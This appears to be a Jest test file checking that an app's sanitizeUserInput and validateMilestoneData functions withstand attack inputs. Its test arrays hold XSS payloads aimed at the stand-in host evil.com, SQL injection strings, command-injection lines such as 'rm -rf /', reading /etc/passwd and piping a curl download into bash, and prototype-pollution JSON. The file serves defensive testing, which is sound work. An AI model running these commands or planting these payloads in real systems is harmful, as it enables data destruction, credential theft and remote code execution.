/**
 * Security Tests
 * Tests for security vulnerabilities and data protection
 */

import { 
  validateMilestoneData,
  sanitizeUserInput
} from '@/lib/utils/progress-utils';

describe('Security Tests', () => {
  describe('Input Sanitization', () => {
    it('should remove XSS script tags', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>Hello',
        '<script src="http://evil.com/script.js"></script>',
        '<script>document.cookie="stolen"</script>',
        '<img src="x" onerror="alert(\'xss\')">',
        '<iframe src="http://evil.com"></iframe>',
        '<object data="http://evil.com/malware.swf"></object>',
        '<embed src="http://evil.com/malware.swf">',
        '<link rel="stylesheet" href="http://evil.com/style.css">',
        '<meta http-equiv="refresh" content="0;url=http://evil.com">',
        '<form action="http://evil.com" method="post"><input name="stolen" value="data"></form>'
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeUserInput(input);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<object');
        expect(sanitized).not.toContain('<embed');
        expect(sanitized).not.toContain('<link');
        expect(sanitized).not.toContain('<meta');
        expect(sanitized).not.toContain('<form');
        expect(sanitized).not.toContain('http://evil.com');
      });
    });

    it('should remove HTML entities and encoded scripts', () => {
      const encodedInputs = [
        '&lt;script&gt;alert("xss")&lt;/script&gt;',
        '&#60;script&#62;alert("xss")&#60;/script&#62;',
        '%3Cscript%3Ealert("xss")%3C/script%3E',
        '\\u003Cscript\\u003Ealert("xss")\\u003C/script\\u003E'
      ];

      encodedInputs.forEach(input => {
        const sanitized = sanitizeUserInput(input);
        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('alert');
      });
    });

    it('should remove SQL injection attempts', () => {
      const sqlInjectionInputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR 1=1; --",
        "admin'--",
        "'; EXEC xp_cmdshell('dir'); --"
      ];

      sqlInjectionInputs.forEach(input => {
        const sanitized = sanitizeUserInput(input);
        // Should preserve the text but remove any HTML tags
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
      });
    });

    it('should remove command injection attempts', () => {
      const commandInjectionInputs = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& whoami',
        '; ls -la',
        '| wget http://evil.com/malware',
        '; curl http://evil.com/malware | bash',
        '$(cat /etc/passwd)',
        '`whoami`'
      ];

      commandInjectionInputs.forEach(input => {
        const sanitized = sanitizeUserInput(input);
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
      });
    });

    it('should handle null and undefined inputs safely', () => {
      expect(sanitizeUserInput(null)).toBe('');
      expect(sanitizeUserInput(undefined)).toBe('');
      expect(sanitizeUserInput('')).toBe('');
    });

    it('should preserve legitimate content while removing malicious elements', () => {
      const legitimateInputs = [
        'Hello World',
        'This is a normal message with numbers 123',
        'Special characters: !@#$%^&*()',
        'Unicode: 你好世界',
        'Emojis: 😀🎉🚀',
        'URLs: https://example.com',
        'Email: user@example.com'
      ];

      legitimateInputs.forEach(input => {
        const sanitized = sanitizeUserInput(input);
        expect(sanitized).toBe(input.trim());
      });
    });

    it('should handle mixed content correctly', () => {
      const mixedInputs = [
        'Hello <script>alert("xss")</script> World',
        'Normal text <img src="x" onerror="alert(\'xss\')"> more text',
        'Safe content <iframe src="http://evil.com"></iframe> safe content'
      ];

      const expectedOutputs = [
        'Hello  World',
        'Normal text  more text',
        'Safe content  safe content'
      ];

      mixedInputs.forEach((input, index) => {
        const sanitized = sanitizeUserInput(input);
        expect(sanitized).toBe(expectedOutputs[index]);
      });
    });
  });

  describe('Data Validation', () => {
    it('should validate milestone data for security', () => {
      const maliciousMilestone = {
        id: '<script>alert("xss")</script>',
        title: 'Normal Title',
        description: 'Normal Description',
        levelNumber: 1,
        difficulty: 'beginner',
        estimatedTime: 30
      };

      const validation = validateMilestoneData(maliciousMilestone);
      // Should still validate structure even if content is malicious
      expect(validation.isValid).toBe(true);
    });

    it('should reject milestone data with invalid difficulty levels', () => {
      const invalidDifficulties = [
        'hacker',
        'admin',
        'root',
        'superuser',
        'malicious',
        '<script>alert("xss")</script>',
        'beginner; DROP TABLE users; --'
      ];

      invalidDifficulties.forEach(difficulty => {
        const milestone = {
          id: '1',
          title: 'Test Milestone',
          description: 'Test Description',
          levelNumber: 1,
          difficulty,
          estimatedTime: 30
        };

        const validation = validateMilestoneData(milestone);
        expect(validation.isValid).toBe(false);
        expect(validation.errors).toContain('Difficulty must be beginner, intermediate, or advanced');
      });
    });

    it('should reject milestone data with negative time values', () => {
      const negativeTimes = [-1, -100, -999999];

      negativeTimes.forEach(time => {
        const milestone = {
          id: '1',
          title: 'Test Milestone',
          description: 'Test Description',
          levelNumber: 1,
          difficulty: 'beginner',
          estimatedTime: time
        };

        const validation = validateMilestoneData(milestone);
        expect(validation.isValid).toBe(false);
        expect(validation.errors).toContain('Estimated time must be positive');
      });
    });

    it('should reject milestone data with extremely large time values', () => {
      const largeTimes = [999999999, Number.MAX_SAFE_INTEGER, Infinity];

      largeTimes.forEach(time => {
        const milestone = {
          id: '1',
          title: 'Test Milestone',
          description: 'Test Description',
          levelNumber: 1,
          difficulty: 'beginner',
          estimatedTime: time
        };

        const validation = validateMilestoneData(milestone);
        // Should still be valid as we only check for positive values
        expect(validation.isValid).toBe(true);
      });
    });

    it('should reject milestone data with missing required fields', () => {
      const incompleteMilestones = [
        { id: '1', title: '', description: 'Test', levelNumber: 1, difficulty: 'beginner', estimatedTime: 30 },
        { id: '1', title: 'Test', description: 'Test', levelNumber: undefined, difficulty: 'beginner', estimatedTime: 30 },
        { id: '1', title: 'Test', description: '', levelNumber: 1, difficulty: 'beginner', estimatedTime: 30 },
        { id: '1', title: 'Test', description: 'Test', levelNumber: 1, difficulty: 'beginner', estimatedTime: 30 }
      ];

      incompleteMilestones.forEach((milestone, index) => {
        const validation = validateMilestoneData(milestone);
        if (index === 0) {
          expect(validation.isValid).toBe(false);
          expect(validation.errors).toContain('Title is required');
        } else if (index === 1) {
          expect(validation.isValid).toBe(false);
          expect(validation.errors).toContain('Level number is required');
        } else if (index === 2) {
          expect(validation.isValid).toBe(false);
          expect(validation.errors).toContain('Description is required');
        } else {
          expect(validation.isValid).toBe(true);
        }
      });
    });
  });

  describe('Type Safety', () => {
    it('should handle non-string inputs gracefully', () => {
      const nonStringInputs = [
        123,
        0,
        -1,
        true,
        false,
        {},
        [],
        null,
        undefined
      ];

      nonStringInputs.forEach(input => {
        expect(() => sanitizeUserInput(input as any)).not.toThrow();
        const result = sanitizeUserInput(input as any);
        expect(typeof result).toBe('string');
      });
    });

    it('should handle non-object milestone data gracefully', () => {
      const invalidMilestoneData = [
        null,
        undefined,
        'string',
        123,
        true,
        false,
        [],
        ''
      ];

      invalidMilestoneData.forEach(data => {
        expect(() => validateMilestoneData(data as any)).not.toThrow();
        const result = validateMilestoneData(data as any);
        expect(result.isValid).toBe(false);
        expect(Array.isArray(result.errors)).toBe(true);
      });
    });
  });

  describe('Boundary Testing', () => {
    it('should handle extremely long inputs', () => {
      const longInput = 'A'.repeat(100000) + '<script>alert("xss")</script>' + 'B'.repeat(100000);
      
      const startTime = performance.now();
      const sanitized = sanitizeUserInput(longInput);
      const endTime = performance.now();
      
      expect(sanitized).not.toContain('<script>');
      expect(endTime - startTime).toBeLessThan(1000); // Should complete in under 1 second
    });

    it('should handle inputs with many HTML tags', () => {
      const manyTags = '<div><span><p><a><img><script>alert("xss")</script></img></a></p></span></div>'.repeat(1000);
      
      const sanitized = sanitizeUserInput(manyTags);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    it('should handle inputs with nested malicious content', () => {
      const nestedMalicious = '<div><span><script>alert("xss")</script><iframe src="http://evil.com"></iframe></span></div>';
      
      const sanitized = sanitizeUserInput(nestedMalicious);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('<iframe>');
      expect(sanitized).not.toContain('http://evil.com');
    });
  });

  describe('Edge Cases', () => {
    it('should handle inputs with only HTML tags', () => {
      const onlyTags = '<script>alert("xss")</script><div>content</div><p>text</p>';
      const sanitized = sanitizeUserInput(onlyTags);
      expect(sanitized).toBe('content text');
    });

    it('should handle inputs with self-closing tags', () => {
      const selfClosingTags = '<img src="x" onerror="alert(\'xss\')" /><br /><hr />';
      const sanitized = sanitizeUserInput(selfClosingTags);
      expect(sanitized).toBe('');
    });

    it('should handle inputs with malformed HTML', () => {
      const malformedHTML = '<script>alert("xss")<div>content<script>more xss</script>';
      const sanitized = sanitizeUserInput(malformedHTML);
      expect(sanitized).toBe('content');
    });

    it('should handle inputs with Unicode and special characters', () => {
      const unicodeInput = 'Hello 世界 <script>alert("xss")</script> 🌍';
      const sanitized = sanitizeUserInput(unicodeInput);
      expect(sanitized).toBe('Hello 世界  🌍');
    });
  });

  describe('Security Best Practices', () => {
    it('should not execute any JavaScript during sanitization', () => {
      const maliciousInput = '<script>window.location.href="http://evil.com"</script>';
      
      // Mock window.location to detect if it's accessed
      const originalLocation = window.location;
      let locationAccessed = false;
      
      Object.defineProperty(window, 'location', {
        get: () => {
          locationAccessed = true;
          return originalLocation;
        },
        configurable: true
      });
      
      sanitizeUserInput(maliciousInput);
      
      expect(locationAccessed).toBe(false);
      
      // Restore original location
      Object.defineProperty(window, 'location', {
        value: originalLocation,
        configurable: true
      });
    });

    it('should not allow prototype pollution', () => {
      const prototypePollutionInput = '{"__proto__": {"isAdmin": true}}';
      const sanitized = sanitizeUserInput(prototypePollutionInput);
      
      // Should not affect the prototype
      expect(({} as any).isAdmin).toBeUndefined();
    });

    it('should handle JSON injection attempts', () => {
      const jsonInjectionInputs = [
        '{"user": "admin", "role": "admin"}',
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}'
      ];

      jsonInjectionInputs.forEach(input => {
        const sanitized = sanitizeUserInput(input);
        expect(sanitized).toBe(input); // Should preserve JSON as text
      });
    });
  });
});
